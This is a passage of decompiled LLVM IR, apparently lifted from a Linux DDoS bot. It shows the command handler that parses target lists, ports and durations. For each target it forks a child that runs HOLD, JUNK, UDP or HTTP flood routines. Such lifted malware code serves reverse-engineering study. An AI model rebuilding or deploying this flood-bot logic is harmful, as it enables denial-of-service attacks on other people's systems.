dec_label_pc_80502ac:                             ; preds = %dec_label_pc_8050293
  %v1_80502af = add i32 %tmp217, 4
  %v1_80502b2 = inttoptr i32 %v1_80502af to i32*
  %v2_80502b2 = load i32, i32* %v1_80502b2, align 4
  store i1 %v5_805027e, i1* %cf.global-to-local, align 1
  %v2_80502c0 = load i32, i32* %v1_8050281, align 4
  %v2_80502c5 = call i32 @atol(i32 %v2_80502c0)
  store i1 %v5_8050296, i1* %cf.global-to-local, align 1
  %v2_80502d6 = load i32, i32* %v1_8050299, align 4
  %v2_80502db = call i32 @atol(i32 %v2_80502d6)
  %v4_80502f4 = inttoptr i32 %v2_80502b2 to i8*
  %v4_80502f7 = call i32 @__GI_strchr(i8* %v4_80502f4, i32 44)
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_80502fc = icmp eq i32 %v4_80502f7, 0
  br i1 %v1_80502fc, label %dec_label_pc_805037a, label %dec_label_pc_8050300

dec_label_pc_8050300:                             ; preds = %dec_label_pc_80502ac
  store i32 %v2_80502b2, i32* @eax, align 4
  %v3_8050311 = call i32 @__GI_strtok(i32 %v2_80502b2, i32 ptrtoint (i32* @global_var_805d311.859 to i32))
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_805036f89 = icmp eq i32 %v3_8050311, 0
  %v1_805037696 = icmp eq i1 %v4_805036f89, false
  br i1 %v1_805037696, label %dec_label_pc_805031e, label %dec_label_pc_80503b5

dec_label_pc_805031e:                             ; preds = %dec_label_pc_8050300, %dec_label_pc_8050355
  %storemerge1297 = phi i32 [ %v3_8050364, %dec_label_pc_8050355 ], [ %v3_8050311, %dec_label_pc_8050300 ]
  %v0_805031e = call i32 @listFork()
  store i32 %v0_805031e, i32* @eax, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_8050323 = icmp eq i32 %v0_805031e, 0
  %v1_8050325 = icmp eq i1 %v1_8050323, false
  br i1 %v1_8050325, label %dec_label_pc_8050355, label %dec_label_pc_8050327

dec_label_pc_8050327:                             ; preds = %dec_label_pc_805031e
  %v4_8050344 = call i32 @sendHOLD(i32 %storemerge1297, i32 %v2_80502c5, i32 %v2_80502db)
  %v2_8050350 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_8050355:                             ; preds = %dec_label_pc_805031e
  %v3_8050364 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_805d311.859 to i32))
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_805036f = icmp eq i32 %v3_8050364, 0
  %v1_8050376 = icmp eq i1 %v4_805036f, false
  br i1 %v1_8050376, label %dec_label_pc_805031e, label %dec_label_pc_80503b5

dec_label_pc_805037a:                             ; preds = %dec_label_pc_80502ac
  %v0_805037a = call i32 @listFork()
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_805037f = icmp eq i32 %v0_805037a, 0
  %v1_8050381 = icmp eq i1 %v1_805037f, false
  br i1 %v1_8050381, label %dec_label_pc_8051252, label %dec_label_pc_8050387

dec_label_pc_8050387:                             ; preds = %dec_label_pc_805037a
  %v4_80503a4 = call i32 @sendHOLD(i32 %v2_80502b2, i32 %v2_80502c5, i32 %v2_80502db)
  %v2_80503b0 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_80503b5:                             ; preds = %dec_label_pc_8050355, %dec_label_pc_8050300, %dec_label_pc_8050226
  %v2_80503b8 = load i32, i32* %arg2, align 4
  store i1 false, i1* @df, align 1
  %v4_80503d5 = inttoptr i32 %v2_80503b8 to i8*
  store i32 %v2_80503b8, i32* @esi, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_805d3c7.882 to i32), i32* @edi, align 4
  %v7_80503e7 = call i32 @_strncmp(i8* %v4_80503d5, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_805d3c7.882, i32 0, i32 0), i32 5)
  %v8_80503e7 = urem i32 %v7_80503e7, 2
  %v9_80503e7 = icmp eq i32 %v8_80503e7, 0
  %v0_80503e9 = load i1, i1* %cf.global-to-local, align 1
  %v2_80503e9 = or i1 %v0_80503e9, %v9_80503e7
  %v3_80503e9 = zext i1 %v2_80503e9 to i32
  %v4_80503e9 = load i32, i32* @edx, align 4
  %v5_80503e9 = and i32 %v4_80503e9, -256
  %v6_80503e9 = or i32 %v3_80503e9, %v5_80503e9
  %v7_80503e9 = xor i32 %v6_80503e9, 1
  store i32 %v7_80503e9, i32* @edx, align 4
  %v1_80503f1 = trunc i32 %v7_80503e9 to i8
  %v3_80503f1 = zext i1 %v0_80503e9 to i8
  %v4_80503f1 = sub nsw i8 %v1_80503f1, %v3_80503f1
  %v15_80503f1 = icmp eq i8 %v4_80503f1, 0
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_80503fa = icmp eq i1 %v15_80503f1, false
  br i1 %v1_80503fa, label %dec_label_pc_8050555, label %dec_label_pc_8050400

dec_label_pc_8050400:                             ; preds = %dec_label_pc_80503b5
  %v2_80503f5 = sext i8 %v4_80503f1 to i32
  %v9_8050400 = icmp ult i32 %arg1, 3
  store i1 %v9_8050400, i1* %cf.global-to-local, align 1
  %v7_8050404 = icmp sgt i32 %arg1, 3
  br i1 %v7_8050404, label %dec_label_pc_805040a, label %dec_label_pc_8051252

dec_label_pc_805040a:                             ; preds = %dec_label_pc_8050400
  %v1_805040d = add i32 %tmp217, 8
  %v5_805040d = icmp ugt i32* %arg2, inttoptr (i32 -9 to i32*)
  store i1 %v5_805040d, i1* %cf.global-to-local, align 1
  %v1_8050410 = inttoptr i32 %v1_805040d to i32*
  %v2_8050410 = load i32, i32* %v1_8050410, align 4
  %v2_8050415 = call i32 @atol(i32 %v2_8050410)
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp227 = icmp slt i32 %v2_8050415, 1
  br i1 %tmp227, label %dec_label_pc_8051252, label %dec_label_pc_8050422

dec_label_pc_8050422:                             ; preds = %dec_label_pc_805040a
  %v1_8050425 = add i32 %tmp217, 12
  %v5_8050425 = icmp ugt i32* %arg2, inttoptr (i32 -13 to i32*)
  store i1 %v5_8050425, i1* %cf.global-to-local, align 1
  %v1_8050428 = inttoptr i32 %v1_8050425 to i32*
  %v2_8050428 = load i32, i32* %v1_8050428, align 4
  %v2_805042d = call i32 @atol(i32 %v2_8050428)
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp228 = icmp slt i32 %v2_805042d, 1
  %tmp229 = icmp eq i1 %tmp228, false
  br i1 %tmp229, label %dec_label_pc_805043b, label %dec_label_pc_8051252

dec_label_pc_805043b:                             ; preds = %dec_label_pc_8050422
  %v1_805043e = add i32 %tmp217, 4
  %v1_8050441 = inttoptr i32 %v1_805043e to i32*
  %v2_8050441 = load i32, i32* %v1_8050441, align 4
  store i1 %v5_805040d, i1* %cf.global-to-local, align 1
  %v2_805044f = load i32, i32* %v1_8050410, align 4
  %v2_8050454 = call i32 @atol(i32 %v2_805044f)
  store i1 %v5_8050425, i1* %cf.global-to-local, align 1
  %v2_8050465 = load i32, i32* %v1_8050428, align 4
  %v2_805046a = call i32 @atol(i32 %v2_8050465)
  %v4_8050483 = inttoptr i32 %v2_8050441 to i8*
  %v4_8050486 = call i32 @__GI_strchr(i8* %v4_8050483, i32 44)
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_805048b = icmp eq i32 %v4_8050486, 0
  br i1 %v1_805048b, label %dec_label_pc_805051a, label %dec_label_pc_8050493

dec_label_pc_8050493:                             ; preds = %dec_label_pc_805043b
  store i32 %v2_8050441, i32* @eax, align 4
  %v3_80504a4 = call i32 @__GI_strtok(i32 %v2_8050441, i32 ptrtoint (i32* @global_var_805d311.859 to i32))
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_805050f80 = icmp eq i32 %v3_80504a4, 0
  %v1_805051687 = icmp eq i1 %v4_805050f80, false
  br i1 %v1_805051687, label %dec_label_pc_80504b1, label %dec_label_pc_8050555

dec_label_pc_80504b1:                             ; preds = %dec_label_pc_8050493, %dec_label_pc_80504f5
  %storemerge1388 = phi i32 [ %v3_8050504, %dec_label_pc_80504f5 ], [ %v3_80504a4, %dec_label_pc_8050493 ]
  %v0_80504b1 = call i32 @listFork()
  store i32 %v0_80504b1, i32* @eax, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_80504b6 = icmp eq i32 %v0_80504b1, 0
  %v1_80504b8 = icmp eq i1 %v1_80504b6, false
  br i1 %v1_80504b8, label %dec_label_pc_80504f5, label %dec_label_pc_80504ba

dec_label_pc_80504ba:                             ; preds = %dec_label_pc_80504b1
  %v4_80504d7 = call i32 @sendJUNK(i32 %storemerge1388, i32 %v2_8050454, i32 %v2_805046a)
  %v0_80504dc = load i8*, i8** @global_var_805f4e0.20, align 4
  %v1_80504dc = ptrtoint i8* %v0_80504dc to i32
  %v2_80504e4 = call i32 @__libc_close(i32 %v1_80504dc)
  %v2_80504f0 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_80504f5:                             ; preds = %dec_label_pc_80504b1
  %v3_8050504 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_805d311.859 to i32))
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_805050f = icmp eq i32 %v3_8050504, 0
  %v1_8050516 = icmp eq i1 %v4_805050f, false
  br i1 %v1_8050516, label %dec_label_pc_80504b1, label %dec_label_pc_8050555

dec_label_pc_805051a:                             ; preds = %dec_label_pc_805043b
  %v0_805051a = call i32 @listFork()
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_805051f = icmp eq i32 %v0_805051a, 0
  %v1_8050521 = icmp eq i1 %v1_805051f, false
  br i1 %v1_8050521, label %dec_label_pc_8051252, label %dec_label_pc_8050527

dec_label_pc_8050527:                             ; preds = %dec_label_pc_805051a
  %v4_8050544 = call i32 @sendJUNK(i32 %v2_8050441, i32 %v2_8050454, i32 %v2_805046a)
  %v2_8050550 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_8050555:                             ; preds = %dec_label_pc_80504f5, %dec_label_pc_8050493, %dec_label_pc_80503b5
  %v2_8050558 = load i32, i32* %arg2, align 4
  store i1 false, i1* @df, align 1
  %v4_8050575 = inttoptr i32 %v2_8050558 to i8*
  store i32 ptrtoint ([4 x i8]* @global_var_805d3cc.883 to i32), i32* @edi, align 4
  %v7_8050587 = call i32 @_strncmp(i8* %v4_8050575, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805d3cc.883, i32 0, i32 0), i32 4)
  %v8_8050587 = urem i32 %v7_8050587, 2
  %v9_8050587 = icmp eq i32 %v8_8050587, 0
  %v0_8050589 = load i1, i1* %cf.global-to-local, align 1
  %v2_8050589 = or i1 %v0_8050589, %v9_8050587
  %v3_8050589 = zext i1 %v2_8050589 to i32
  %v4_8050589 = load i32, i32* @edx, align 4
  %v5_8050589 = and i32 %v4_8050589, -256
  %v6_8050589 = or i32 %v3_8050589, %v5_8050589
  %v7_8050589 = xor i32 %v6_8050589, 1
  store i32 %v7_8050589, i32* @edx, align 4
  %v1_8050591 = trunc i32 %v7_8050589 to i8
  %v3_8050591 = zext i1 %v0_8050589 to i8
  %v4_8050591 = sub nsw i8 %v1_8050591, %v3_8050591
  %v15_8050591 = icmp eq i8 %v4_8050591, 0
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_805059a = icmp eq i1 %v15_8050591, false
  br i1 %v1_805059a, label %dec_label_pc_80507da, label %dec_label_pc_80505a0

dec_label_pc_80505a0:                             ; preds = %dec_label_pc_8050555
  %v2_8050595 = sext i8 %v4_8050591 to i32
  %v9_80505a0 = icmp ult i32 %arg1, 5
  store i1 %v9_80505a0, i1* %cf.global-to-local, align 1
  %v7_80505a4 = icmp sgt i32 %arg1, 5
  br i1 %v7_80505a4, label %dec_label_pc_80505aa, label %dec_label_pc_8051252

dec_label_pc_80505aa:                             ; preds = %dec_label_pc_80505a0
  %v1_80505ad = add i32 %tmp217, 12
  %v5_80505ad = icmp ugt i32* %arg2, inttoptr (i32 -13 to i32*)
  store i1 %v5_80505ad, i1* %cf.global-to-local, align 1
  %v1_80505b0 = inttoptr i32 %v1_80505ad to i32*
  %v2_80505b0 = load i32, i32* %v1_80505b0, align 4
  %v2_80505b5 = call i32 @atol(i32 %v2_80505b0)
  %v5_80505ba = icmp ne i32 %v2_80505b5, -1
  store i1 %v5_80505ba, i1* %cf.global-to-local, align 1
  %v10_80505ba = icmp eq i32 %v2_80505b5, -1
  br i1 %v10_80505ba, label %dec_label_pc_8051252, label %dec_label_pc_80505c3

dec_label_pc_80505c3:                             ; preds = %dec_label_pc_80505aa
  %v1_80505c6 = add i32 %tmp217, 8
  %v5_80505c6 = icmp ugt i32* %arg2, inttoptr (i32 -9 to i32*)
  store i1 %v5_80505c6, i1* %cf.global-to-local, align 1
  %v1_80505c9 = inttoptr i32 %v1_80505c6 to i32*
  %v2_80505c9 = load i32, i32* %v1_80505c9, align 4
  %v2_80505ce = call i32 @atol(i32 %v2_80505c9)
  %v5_80505d3 = icmp ne i32 %v2_80505ce, -1
  store i1 %v5_80505d3, i1* %cf.global-to-local, align 1
  %v10_80505d3 = icmp eq i32 %v2_80505ce, -1
  br i1 %v10_80505d3, label %dec_label_pc_8051252, label %dec_label_pc_80505dc

dec_label_pc_80505dc:                             ; preds = %dec_label_pc_80505c3
  %v1_80505df = add i32 %tmp217, 16
  %v2_80505df = icmp ugt i32* %arg2, inttoptr (i32 -17 to i32*)
  store i1 %v2_80505df, i1* %cf.global-to-local, align 1
  %v1_80505e2 = inttoptr i32 %v1_80505df to i32*
  %v2_80505e2 = load i32, i32* %v1_80505e2, align 4
  %v2_80505e7 = call i32 @atol(i32 %v2_80505e2)
  %v5_80505ec = icmp ne i32 %v2_80505e7, -1
  store i1 %v5_80505ec, i1* %cf.global-to-local, align 1
  %v10_80505ec = icmp eq i32 %v2_80505e7, -1
  br i1 %v10_80505ec, label %dec_label_pc_8051252, label %dec_label_pc_80505f5

dec_label_pc_80505f5:                             ; preds = %dec_label_pc_80505dc
  %v1_80505f8 = add i32 %tmp217, 20
  %v5_80505f8 = icmp ugt i32* %arg2, inttoptr (i32 -21 to i32*)
  store i1 %v5_80505f8, i1* %cf.global-to-local, align 1
  %v1_80505fb = inttoptr i32 %v1_80505f8 to i32*
  %v2_80505fb = load i32, i32* %v1_80505fb, align 4
  %v2_8050600 = call i32 @atol(i32 %v2_80505fb)
  %v5_8050605 = icmp ne i32 %v2_8050600, -1
  store i1 %v5_8050605, i1* %cf.global-to-local, align 1
  %v10_8050605 = icmp eq i32 %v2_8050600, -1
  br i1 %v10_8050605, label %dec_label_pc_8051252, label %dec_label_pc_805060e

dec_label_pc_805060e:                             ; preds = %dec_label_pc_80505f5
  store i1 %v5_80505f8, i1* %cf.global-to-local, align 1
  %v2_8050614 = load i32, i32* %v1_80505fb, align 4
  %v2_8050619 = call i32 @atol(i32 %v2_8050614)
  %v1_805061e = add i32 %v2_8050619, -65500
  %v5_805061e = icmp ult i32 %v2_8050619, 65500
  %v6_805061e = sub i32 65499, %v2_8050619
  %v7_805061e = and i32 %v6_805061e, %v2_8050619
  %v8_805061e = icmp slt i32 %v7_805061e, 0
  store i1 %v5_805061e, i1* %cf.global-to-local, align 1
  %v9_805061e = icmp eq i32 %v1_805061e, 0
  %v10_805061e = icmp slt i32 %v1_805061e, 0
  %v3_8050623 = icmp eq i1 %v10_805061e, %v8_805061e
  %v4_8050623 = icmp eq i1 %v9_805061e, false
  %v5_8050623 = and i1 %v4_8050623, %v3_8050623
  br i1 %v5_8050623, label %dec_label_pc_8051252, label %dec_label_pc_8050629

dec_label_pc_8050629:                             ; preds = %dec_label_pc_805060e
  store i1 %v2_80505df, i1* %cf.global-to-local, align 1
  %v2_805062f = load i32, i32* %v1_80505e2, align 4
  %v2_8050634 = call i32 @atol(i32 %v2_805062f)
  %v1_8050639 = add i32 %v2_8050634, -32
  %v2_8050639 = icmp ult i32 %v2_8050634, 32
  %v3_8050639 = sub i32 31, %v2_8050634
  %v4_8050639 = and i32 %v3_8050639, %v2_8050634
  %v5_8050639 = icmp slt i32 %v4_8050639, 0
  store i1 %v2_8050639, i1* %cf.global-to-local, align 1
  %v6_8050639 = icmp eq i32 %v1_8050639, 0
  %v7_8050639 = icmp slt i32 %v1_8050639, 0
  %v3_805063c = icmp eq i1 %v7_8050639, %v5_8050639
  %v4_805063c = icmp eq i1 %v6_8050639, false
  %v5_805063c = and i1 %v4_805063c, %v3_805063c
  br i1 %v5_805063c, label %dec_label_pc_8051252, label %dec_label_pc_8050642

dec_label_pc_8050642:                             ; preds = %dec_label_pc_8050629
  %v8_8050642 = icmp ult i32 %arg1, 7
  store i1 %v8_8050642, i1* %cf.global-to-local, align 1
  %v12_8050642 = icmp eq i32 %arg1, 7
  %v1_8050646 = icmp eq i1 %v12_8050642, false
  br i1 %v1_8050646, label %dec_label_pc_8050661, label %dec_label_pc_8050648

dec_label_pc_8050648:                             ; preds = %dec_label_pc_8050642
  %v1_805064b = add i32 %tmp217, 24
  %v5_805064b = icmp ugt i32* %arg2, inttoptr (i32 -25 to i32*)
  store i1 %v5_805064b, i1* %cf.global-to-local, align 1
  %v1_805064e = inttoptr i32 %v1_805064b to i32*
  %v2_805064e = load i32, i32* %v1_805064e, align 4
  %v2_8050653 = call i32 @atol(i32 %v2_805064e)
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp230 = icmp slt i32 %v2_8050653, 1
  %tmp231 = icmp eq i1 %tmp230, false
  br i1 %tmp231, label %dec_label_pc_8050661, label %dec_label_pc_8051252

dec_label_pc_8050661:                             ; preds = %dec_label_pc_8050648, %dec_label_pc_8050642
  %v1_8050664 = add i32 %tmp217, 4
  %v1_8050667 = inttoptr i32 %v1_8050664 to i32*
  %v2_8050667 = load i32, i32* %v1_8050667, align 4
  store i1 %v5_80505c6, i1* %cf.global-to-local, align 1
  %v2_8050675 = load i32, i32* %v1_80505c9, align 4
  %v2_805067a = call i32 @atol(i32 %v2_8050675)
  store i1 %v5_80505ad, i1* %cf.global-to-local, align 1
  %v2_805068b = load i32, i32* %v1_80505b0, align 4
  %v2_8050690 = call i32 @atol(i32 %v2_805068b)
  store i1 %v2_80505df, i1* %cf.global-to-local, align 1
  %v2_805069e = load i32, i32* %v1_80505e2, align 4
  %v2_80506a3 = call i32 @atol(i32 %v2_805069e)
  store i1 %v5_80505f8, i1* %cf.global-to-local, align 1
  %v2_80506b1 = load i32, i32* %v1_80505fb, align 4
  %v2_80506b6 = call i32 @atol(i32 %v2_80506b1)
  store i1 %v8_8050642, i1* %cf.global-to-local, align 1
  br i1 %v1_8050646, label %dec_label_pc_80506e6, label %dec_label_pc_80506c4

dec_label_pc_80506c4:                             ; preds = %dec_label_pc_8050661
  %v1_80506c7 = add i32 %tmp217, 24
  %v5_80506c7 = icmp ugt i32* %arg2, inttoptr (i32 -25 to i32*)
  store i1 %v5_80506c7, i1* %cf.global-to-local, align 1
  %v1_80506ca = inttoptr i32 %v1_80506c7 to i32*
  %v2_80506ca = load i32, i32* %v1_80506ca, align 4
  %v2_80506cf = call i32 @atol(i32 %v2_80506ca)
  br label %dec_label_pc_80506e6

dec_label_pc_80506e6:                             ; preds = %dec_label_pc_8050661, %dec_label_pc_80506c4
  %storemerge9 = phi i32 [ %v2_80506cf, %dec_label_pc_80506c4 ], [ 10, %dec_label_pc_8050661 ]
  store i32 %storemerge9, i32* @esi, align 4
  %v4_80506fd = inttoptr i32 %v2_8050667 to i8*
  %v4_8050700 = call i32 @__GI_strchr(i8* %v4_80506fd, i32 44)
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_8050705 = icmp eq i32 %v4_8050700, 0
  br i1 %v1_8050705, label %dec_label_pc_805078d, label %dec_label_pc_805070d

dec_label_pc_805070d:                             ; preds = %dec_label_pc_80506e6
  store i32 %v2_8050667, i32* @eax, align 4
  %v3_805071e = call i32 @__GI_strtok(i32 %v2_8050667, i32 ptrtoint (i32* @global_var_805d311.859 to i32))
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_805078571 = icmp eq i32 %v3_805071e, 0
  %v1_805078978 = icmp eq i1 %v4_805078571, false
  br i1 %v1_805078978, label %dec_label_pc_8050728, label %dec_label_pc_80507da

dec_label_pc_8050728:                             ; preds = %dec_label_pc_805070d, %dec_label_pc_805076e
  %storemerge1479 = phi i32 [ %v3_805077d, %dec_label_pc_805076e ], [ %v3_805071e, %dec_label_pc_805070d ]
  %v0_8050728 = call i32 @listFork()
  store i32 %v0_8050728, i32* @eax, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_805072d = icmp eq i32 %v0_8050728, 0
  %v1_805072f = icmp eq i1 %v1_805072d, false
  br i1 %v1_805072f, label %dec_label_pc_805076e, label %dec_label_pc_8050731

dec_label_pc_8050731:                             ; preds = %dec_label_pc_8050728
  %v7_805075d = call i32 @sendUDP(i32 %storemerge1479, i32 %v2_805067a, i32 %v2_8050690, i32 %v2_80506a3, i32 %v2_80506b6, i32 %storemerge9)
  %v2_8050769 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_805076e:                             ; preds = %dec_label_pc_8050728
  %v3_805077d = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_805d311.859 to i32))
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_8050785 = icmp eq i32 %v3_805077d, 0
  %v1_8050789 = icmp eq i1 %v4_8050785, false
  br i1 %v1_8050789, label %dec_label_pc_8050728, label %dec_label_pc_80507da

dec_label_pc_805078d:                             ; preds = %dec_label_pc_80506e6
  %v0_805078d = call i32 @listFork()
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_8050792 = icmp eq i32 %v0_805078d, 0
  %v1_8050794 = icmp eq i1 %v1_8050792, false
  br i1 %v1_8050794, label %dec_label_pc_8051252, label %dec_label_pc_805079a

dec_label_pc_805079a:                             ; preds = %dec_label_pc_805078d
  %v7_80507c9 = call i32 @sendUDP(i32 %v2_8050667, i32 %v2_805067a, i32 %v2_8050690, i32 %v2_80506a3, i32 %v2_80506b6, i32 %storemerge9)
  %v2_80507d5 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_80507da:                             ; preds = %dec_label_pc_805076e, %dec_label_pc_805070d, %dec_label_pc_8050555
  %v2_80507dd = load i32, i32* %arg2, align 4
  store i1 false, i1* @df, align 1
  %v4_80507fa = inttoptr i32 %v2_80507dd to i8*
  store i32 %v2_80507dd, i32* @esi, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_805d3d0.884 to i32), i32* @edi, align 4
  %v7_805080c = call i32 @_strncmp(i8* %v4_80507fa, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_805d3d0.884, i32 0, i32 0), i32 5)
  %v8_805080c = urem i32 %v7_805080c, 2
  %v9_805080c = icmp eq i32 %v8_805080c, 0
  %v0_805080e = load i1, i1* %cf.global-to-local, align 1
  %v2_805080e = or i1 %v0_805080e, %v9_805080c
  %v3_805080e = zext i1 %v2_805080e to i32
  %v4_805080e = load i32, i32* @edx, align 4
  %v5_805080e = and i32 %v4_805080e, -256
  %v6_805080e = or i32 %v3_805080e, %v5_805080e
  %v7_805080e = xor i32 %v6_805080e, 1
  store i32 %v7_805080e, i32* @edx, align 4
  %v3_8050814 = and i32 %v7_805080c, -256
  %v1_8050816 = trunc i32 %v7_805080e to i8
  %v3_8050816 = zext i1 %v0_805080e to i8
  %v4_8050816 = sub nsw i8 %v1_8050816, %v3_8050816
  %v15_8050816 = icmp eq i8 %v4_8050816, 0
  %v20_8050816 = zext i8 %v4_8050816 to i32
  %v23_8050816 = or i32 %v20_8050816, %v3_8050814
  store i32 %v23_8050816, i32* @ecx, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_805081f = icmp eq i1 %v15_8050816, false
  br i1 %v1_805081f, label %dec_label_pc_80509a5, label %dec_label_pc_8050825

dec_label_pc_8050825:                             ; preds = %dec_label_pc_80507da
  %v2_805081a = sext i8 %v4_8050816 to i32
  %v9_8050825 = icmp ult i32 %arg1, 5
  store i1 %v9_8050825, i1* %cf.global-to-local, align 1
  %v7_8050829 = icmp sgt i32 %arg1, 5
  br i1 %v7_8050829, label %dec_label_pc_805082f, label %dec_label_pc_8051252

dec_label_pc_805082f:                             ; preds = %dec_label_pc_8050825
  %v1_8050832 = add i32 %tmp217, 4
  %v5_8050832 = icmp ugt i32* %arg2, inttoptr (i32 -5 to i32*)
  store i1 %v5_8050832, i1* %cf.global-to-local, align 1
  %v1_8050835 = inttoptr i32 %v1_8050832 to i32*
  %v2_8050835 = load i32, i32* %v1_8050835, align 4
  %v4_805083f = inttoptr i32 %v2_8050835 to i8*
  %v4_8050842 = call i32 @__GI_strchr(i8* %v4_805083f, i32 44)
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_8050847 = icmp eq i32 %v4_8050842, 0
  br i1 %v1_8050847, label %dec_label_pc_805091b, label %dec_label_pc_805084f

dec_label_pc_805084f:                             ; preds = %dec_label_pc_805082f
  store i1 %v5_8050832, i1* %cf.global-to-local, align 1
  %v2_8050855 = load i32, i32* %v1_8050835, align 4
  store i32 %v2_8050855, i32* @eax, align 4
  %v3_8050862 = call i32 @__GI_strtok(i32 %v2_8050855, i32 ptrtoint (i32* @global_var_805d311.859 to i32))
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_805090c63 = icmp eq i32 %v3_8050862, 0
  %v1_805091070 = icmp eq i1 %v4_805090c63, false
  br i1 %v1_805091070, label %dec_label_pc_805086f, label %dec_label_pc_80509a5

dec_label_pc_805086f:                             ; preds = %dec_label_pc_805084f, %dec_label_pc_80508f5
  %v0_805086f = call i32 @listFork()
  store i32 %v0_805086f, i32* @eax, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_8050874 = icmp eq i32 %v0_805086f, 0
  %v1_8050876 = icmp eq i1 %v1_8050874, false
  br i1 %v1_8050876, label %dec_label_pc_80508f5, label %dec_label_pc_8050878

dec_label_pc_8050878:                             ; preds = %dec_label_pc_805086f
  %v1_805087b = add i32 %tmp217, 24
  %v5_805087b = icmp ugt i32* %arg2, inttoptr (i32 -25 to i32*)
  store i1 %v5_805087b, i1* %cf.global-to-local, align 1
  %v1_805087e = inttoptr i32 %v1_805087b to i32*
  %v2_805087e = load i32, i32* %v1_805087e, align 4
  %v2_8050883 = call i32 @atol(i32 %v2_805087e)
  store i32 %v2_8050883, i32* @ebx, align 4
  %v1_805088d = add i32 %tmp217, 20
  %v5_805088d = icmp ugt i32* %arg2, inttoptr (i32 -21 to i32*)
  store i1 %v5_805088d, i1* %cf.global-to-local, align 1
  %v1_8050890 = inttoptr i32 %v1_805088d to i32*
  %v2_8050890 = load i32, i32* %v1_8050890, align 4
  %v2_8050895 = call i32 @atol(i32 %v2_8050890)
  store i32 %v2_8050895, i32* @esi, align 4
  %v1_805089f = add i32 %tmp217, 16
  %v1_80508a2 = inttoptr i32 %v1_805089f to i32*
  %v2_80508a2 = load i32, i32* %v1_80508a2, align 4
  store i32 %v2_80508a2, i32* @edi, align 4
  %v1_80508a9 = add i32 %tmp217, 12
  %v5_80508a9 = icmp ugt i32* %arg2, inttoptr (i32 -13 to i32*)
  store i1 %v5_80508a9, i1* %cf.global-to-local, align 1
  %v1_80508ac = inttoptr i32 %v1_80508a9 to i32*
  %v2_80508ac = load i32, i32* %v1_80508ac, align 4
  %v2_80508b1 = call i32 @atol(i32 %v2_80508ac)
  %v1_80508b6 = urem i32 %v2_80508b1, 65536
  store i32 %v1_80508b6, i32* %edx.global-to-local, align 4
  %v1_80508be = add i32 %tmp217, 8
  %v1_80508c1 = inttoptr i32 %v1_80508be to i32*
  %v2_80508c1 = load i32, i32* %v1_80508c1, align 4
  store i1 %v5_8050832, i1* %cf.global-to-local, align 1
  %v2_80508cb = load i32, i32* %v1_8050835, align 4
  %v0_80508cd = load i32, i32* @ebx, align 4
  %v0_80508d1 = load i32, i32* @esi, align 4
  %v0_80508d5 = load i32, i32* @edi, align 4
  %v7_80508e4 = trunc i32 %v2_80508b1 to i16
  %v8_80508e4 = call i32 @sendHTTP(i32 %v2_80508cb, i32 %v2_80508c1, i16 %v7_80508e4, i32 %v0_80508d5, i32 %v0_80508d1, i32 %v0_80508cd)
  %v2_80508f0 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_80508f5:                             ; preds = %dec_label_pc_805086f
  %v3_8050904 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_805d311.859 to i32))
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_805090c = icmp eq i32 %v3_8050904, 0
  %v1_8050910 = icmp eq i1 %v4_805090c, false
  br i1 %v1_8050910, label %dec_label_pc_805086f, label %dec_label_pc_80509a5

dec_label_pc_805091b:                             ; preds = %dec_label_pc_805082f
  %v0_805091b = call i32 @listFork()
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_8050920 = icmp eq i32 %v0_805091b, 0
  %v1_8050922 = icmp eq i1 %v1_8050920, false
  br i1 %v1_8050922, label %dec_label_pc_8051252, label %dec_label_pc_8050928

dec_label_pc_8050928:                             ; preds = %dec_label_pc_805091b
  %v1_805092b = add i32 %tmp217, 24
  %v5_805092b = icmp ugt i32* %arg2, inttoptr (i32 -25 to i32*)
  store i1 %v5_805092b, i1* %cf.global-to-local, align 1
  %v1_805092e = inttoptr i32 %v1_805092b to i32*
  %v2_805092e = load i32, i32* %v1_805092e, align 4
  %v2_8050933 = call i32 @atol(i32 %v2_805092e)
  store i32 %v2_8050933, i32* @ebx, align 4
  %v1_805093d = add i32 %tmp217, 20
  %v5_805093d = icmp ugt i32* %arg2, inttoptr (i32 -21 to i32*)
  store i1 %v5_805093d, i1* %cf.global-to-local, align 1
  %v1_8050940 = inttoptr i32 %v1_805093d to i32*
